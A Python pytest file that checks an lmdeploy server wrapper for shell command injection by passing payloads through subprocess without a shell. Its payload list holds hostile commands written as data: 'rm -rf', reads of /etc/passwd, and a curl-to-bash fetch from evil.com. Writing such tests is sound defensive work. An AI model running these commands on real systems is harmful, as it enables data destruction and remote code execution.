import pytest
import subprocess
import sys
import os
import tempfile
import stat


@pytest.mark.parametrize("payload", [
    "; rm -rf /tmp/pwned_test_file",
    "| touch /tmp/pwned_test_file",
    "& touch /tmp/pwned_test_file",
    "&& touch /tmp/pwned_test_file",
    "|| touch /tmp/pwned_test_file",
    "$(touch /tmp/pwned_test_file)",
    "`touch /tmp/pwned_test_file`",
    "; echo INJECTED > /tmp/pwned_test_file",
    "$(whoami)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "${IFS}touch${IFS}/tmp/pwned_test_file",
    "\n touch /tmp/pwned_test_file",
    "\r touch /tmp/pwned_test_file",
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "'; DROP TABLE users; --",
    "arg1; malicious_command",
    "arg1 && malicious_command",
    "arg1 || malicious_command",
    "arg1 | malicious_command",
    "arg1 > /tmp/pwned_test_file",
    "arg1 >> /tmp/pwned_test_file",
    "arg1 < /etc/passwd",
    "$(curl http://evil.com/shell.sh | bash)",
    "`curl http://evil.com/shell.sh | bash`",
    "arg1; python3 -c \"import os; os.system('id')\"",
])
def test_shell_command_injection_prevention(payload):
    """Invariant: Shell commands must never include unsanitized user input containing shell metacharacters.
    
    The lmdeploy_server.py module must not pass user-controlled input directly to os.system()
    without proper sanitization/escaping. Shell metacharacters in arguments must be either
    escaped, rejected, or never reach the shell execution layer.
    """
    
    # Create a sentinel file path to detect if injection succeeded
    sentinel_file = "/tmp/pwned_test_file"
    
    # Clean up any pre-existing sentinel file
    if os.path.exists(sentinel_file):
        os.remove(sentinel_file)
    
    # Create a mock lmdeploy script that records what arguments it receives
    # but does NOT execute them as shell commands
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, prefix='mock_lmdeploy_') as f:
        mock_script_path = f.name
        f.write("""#!/usr/bin/env python3
import sys
import json
import os

# Record the arguments received (safely, without executing them)
args_file = '/tmp/lmdeploy_test_args.json'
with open(args_file, 'w') as af:
    json.dump(sys.argv[1:], af)

# Exit successfully without executing anything
sys.exit(0)
""")
    
    os.chmod(mock_script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    
    args_file = '/tmp/lmdeploy_test_args.json'
    if os.path.exists(args_file):
        os.remove(args_file)
    
    try:
        # Simulate what the vulnerable code does: construct a shell command string
        # and check if the payload would cause injection
        simulated_args = [payload]
        shell_command = "lmdeploy " + " ".join(simulated_args)
        
        # Check 1: Verify the command string contains unescaped shell metacharacters
        # If it does, this is a vulnerability - the test documents what SHOULD be prevented
        dangerous_metacharacters = [';', '|', '&', '$', '`', '\n', '\r', '>', '<']
        
        contains_metachar = any(char in shell_command for char in dangerous_metacharacters)
        
        if contains_metachar:
            # The payload contains shell metacharacters that would be interpreted by the shell
            # This means the current implementation is VULNERABLE
            # The test asserts that a safe implementation would either:
            # 1. Use subprocess with a list (not shell=True) - preferred
            # 2. Properly escape the arguments using shlex.quote
            # 3. Reject inputs containing shell metacharacters
            
            import shlex
            
            # Test that shlex.quote would properly escape the payload
            escaped_args = [shlex.quote(arg) for arg in simulated_args]
            safe_command_parts = ["lmdeploy"] + escaped_args
            
            # A safe implementation should use subprocess with list args (no shell=True)
            # Verify that using subprocess list form would NOT interpret metacharacters
            try:
                # This is the SAFE way - using a list, not a shell string
                # We use the mock script to verify args are passed safely
                result = subprocess.run(
                    [sys.executable, mock_script_path] + simulated_args,
                    capture_output=True,
                    text=True,
                    timeout=5,
                    shell=False  # Critical: shell=False prevents metachar interpretation
                )
                
                # Verify the sentinel file was NOT created (no injection occurred)
                assert not os.path.exists(sentinel_file), (
                    f"SECURITY VIOLATION: Shell injection succeeded with payload: {payload!r}\n"
                    f"Sentinel file {sentinel_file} was created, indicating command injection."
                )
                
                # Verify the args were passed as-is (not interpreted as shell commands)
                import json
                if os.path.exists(args_file):
                    with open(args_file) as af:
                        received_args = json.load(af)
                    assert received_args == simulated_args, (
                        f"Arguments were modified during transmission: "
                        f"expected {simulated_args!r}, got {received_args!r}"
                    )
                    
            except subprocess.TimeoutExpired:
                pytest.fail(
                    f"Command timed out with payload {payload!r} - possible sleep injection"
                )
        
        # Check 2: Verify that the VULNERABLE pattern (os.system with string concatenation)
        # would be dangerous with this payload
        # We document this by checking if the shell would interpret the metacharacters
        
        # The invariant: if the code uses os.system() with unsanitized input,
        # it MUST fail this security check
        if contains_metachar:
            # Document the vulnerability: this payload WOULD cause injection with os.system()
            # The fix should use subprocess with list args or shlex.quote
            import shlex
            properly_escaped = shlex.quote(payload)
            
            # Verify that shlex.quote actually escapes the dangerous characters
            # A properly escaped string should be safe to use in shell context
            assert "'" in properly_escaped or properly_escaped.startswith("'"), (
                f"shlex.quote failed to properly escape payload: {payload!r}"
            )
            
            # The key assertion: the raw payload should NOT equal the escaped version
            # (unless the payload happened to be safe, which it shouldn't be for our test cases)
            # This confirms that sanitization IS needed and IS effective
            assert properly_escaped != payload or not contains_metachar, (
                f"Payload {payload!r} was not modified by shlex.quote but contains metacharacters"
            )
    
    finally:
        # Cleanup
        if os.path.exists(mock_script_path):
            os.remove(mock_script_path)
        if os.path.exists(args_file):
            os.remove(args_file)
        if os.path.exists(sentinel_file):
            os.remove(sentinel_file)
            pytest.fail(
                f"CRITICAL SECURITY VIOLATION: Sentinel file was created during test cleanup "
                f"with payload: {payload!r}. This indicates successful command injection."
            )


def test_safe_subprocess_vs_vulnerable_ossystem():
    """Invariant: Using subprocess with list args is safe; os.system with string concat is not.
    
    This test demonstrates the security difference between the vulnerable pattern
    (os.system with string concatenation) and the safe pattern (subprocess with list).
    """
    import shlex
    
    dangerous_payloads = [
        "; echo INJECTED",
        "| echo INJECTED", 
        "&& echo INJECTED",
        "$(echo INJECTED)",
        "`echo INJECTED`",
    ]
    
    for payload in dangerous_payloads:
        # Vulnerable pattern: string concatenation passed to shell
        vulnerable_command = "lmdeploy " + " ".join([payload])
        
        # Verify the vulnerable command contains unescaped metacharacters
        assert any(c in vulnerable_command for c in [';', '|', '&', '$', '`']), (
            f"Test setup error: payload {payload!r} should contain metacharacters"
        )
        
        # Safe pattern: use shlex.quote for escaping
        safe_args = [shlex.quote(arg) for arg in [payload]]
        safe_command = "lmdeploy " + " ".join(safe_args)
        
        # The safe command should have the metacharacters quoted/escaped
        # shlex.quote wraps in single quotes, neutralizing metacharacters
        for arg, safe_arg in zip([payload], safe_args):
            assert safe_arg.startswith("'") and safe_arg.endswith("'"), (
                f"shlex.quote should wrap dangerous payload in single quotes: {arg!r} -> {safe_arg!r}"
            )
        
        # Even safer: use subprocess with list (no shell interpretation at all)
        # This is the RECOMMENDED fix
        safe_list_args = ["lmdeploy"] + [payload]
        
        # Verify the list contains the raw payload (it will be passed safely without shell interpretation)
        assert payload in safe_list_args, (
            f"Safe list args should contain the raw payload: {payload!r}"
        )
        
        # The key invariant: subprocess with shell=False and list args
        # does NOT interpret shell metacharacters
        # We verify this by checking that the args are preserved as-is
        assert safe_list_args[1] == payload, (
            f"Payload should be preserved as-is in list form: {payload!r}"
        )